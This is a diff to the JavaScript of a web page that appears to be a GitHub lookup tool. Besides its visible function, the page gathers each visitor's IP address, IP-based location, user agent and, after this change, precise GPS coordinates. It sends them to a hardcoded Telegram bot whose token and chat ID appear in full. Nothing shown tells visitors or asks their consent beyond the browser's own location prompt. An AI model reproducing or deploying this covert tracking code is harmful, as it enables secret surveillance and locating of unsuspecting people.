@@ -169,7 +169,7 @@
             document.getElementById("githubResult").textContent = resultText;
         }
 
-        // Fonction pour récupérer et envoyer l'IP, User-Agent et la localisation via l'IP
+        // Fonction pour récupérer et envoyer l'IP, User-Agent, localisation IP et géolocalisation (latitude/longitude)
         async function sendMobileInfo() {
             const ipInfo = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // Remplace par ton token ipinfo.io
             const ipData = await ipInfo.json();
@@ -177,22 +177,35 @@
             const location = ipData.city + ', ' + ipData.region + ', ' + ipData.country;
             const userAgent = navigator.userAgent;
 
-            // Message à envoyer au bot Telegram
-            const telegramMessage = `☆ Appareil Mobile\nIP: ${ip}\n☆Localisation: ${location}\n☆User-Agent: ${userAgent}`;
+            // Récupérer la géolocalisation du navigateur
+            let geoLocation = '';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
 
-            // Envoie au bot Telegram
-            const botToken = '7463916367:AAFOPjZpfm4th8l6qSTqTuUUBjKwVlDdJ-4';
-            const chatId = '7604426420';
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: telegramMessage
-                })
-            });
+                    geoLocation = `Latitude: ${lat}, Longitude: ${lon}`;
+
+                    // Message à envoyer au bot Telegram avec IP et géolocalisation du navigateur
+                    const telegramMessage = `📱 Appareil Mobile\n☆IP: ${ip}\n☆Localisation IP: ${location}\n☆Localisation GPS: ${geoLocation}\n☆User-Agent: ${userAgent}`;
+
+                    // Envoie au bot Telegram
+                    const botToken = '7463916367:AAFOPjZpfm4th8l6qSTqTuUUBjKwVlDdJ-4';
+                    const chatId = '7604426420';
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: telegramMessage
+                        })
+                    });
+                });
+            } else {
+                console.log("Géolocalisation non disponible");
+            }
         }
 
         document.getElementById("lookupGitHub").addEventListener("click", lookupGitHub);
